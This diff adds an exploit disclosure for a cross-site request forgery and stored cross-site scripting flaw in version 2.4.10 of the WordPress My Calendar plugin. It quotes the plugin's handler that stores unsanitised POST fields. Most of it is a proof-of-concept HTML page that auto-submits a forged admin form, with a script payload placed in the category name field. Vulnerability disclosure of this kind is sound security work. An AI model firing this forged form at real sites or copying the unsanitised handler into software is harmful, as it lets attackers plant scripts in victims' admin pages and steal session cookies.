@@ -1,0 +1,48 @@
+Exploit TItle: My Calendar 2.4.10 CSRF and XSS
+Exploit Author : Mysticism (Ahn Sung Jun)
+Date : 2015-11-06
+Vendor Homepage : http://wordpress.org/plugins/my-calendar
+Software Link : https://downloads.wordpress.org/plugin/my-calendar.2.4.10.zip
+Version : 2.4.10
+Tested On : kail linux Iceweasel
+
+
+===================
+Vulnerable Code : my-calendar-categoris.php
+if ( isset( $_POST['mode'] ) && $_POST['mode'] == 'add' ) {
+			$term = wp_insert_term( $_POST['category_name'], 'mc-event-category' );
+			if ( ! is_wp_error( $term ) ) {
+				$term = $term['term_id'];
+			} else {
+				$term = false;
+			}
+			$add = array(
+				'category_name'    => $_POST['category_name'],
+				'category_color'   => $_POST['category_color'],
+				'category_icon'    => $_POST['category_icon'],
+				'category_private' => ( ( isset( $_POST['category_private'] ) ) ? 1 : 0 ),
+				'category_term'    => $term
+			);
+		}
+
+
+POC (CSRF & XSS)
+
+<html>
+	<body onload="javascript:document.forms[0].submit()">
+	<form id="my-calendar" method="post" action="http://192.168.0.2/wordpress/wp-admin/admin.php?page=my-calendar-categories">
+		<input type="hidden" name="_wpnonce" value="35ed9ab206"/>
+		<input type="hidden" name="mode" value="add"/>
+		<input type="hidden" name="category_id" value="4"/>
+		<input name="category_name"  id="cat_name" type="hidden" class="input" size="30" value="<script>alert(document.cookie)</script>">
+		<input type="hidden" id="cat_color" name="category_color" class="mc-color-input" size="10" maxlength="7" value=""/>
+		<input type="hidden" value="on" name="category_private" id="cat_private" />
+		<input type="hidden" value="on" name="mc_default_category" id="mc_default_category" />
+		<input type="hidden" value="on" name="mc_skip_holidays_category" id="mc_shc" /> 
+		<input type="submit" name="save" class="button-primary" value="Add Category &raquo;"/>
+	</form>	
+</html>
+
+
+Discovered By
+Mysticism(Ahn Sung Jun)
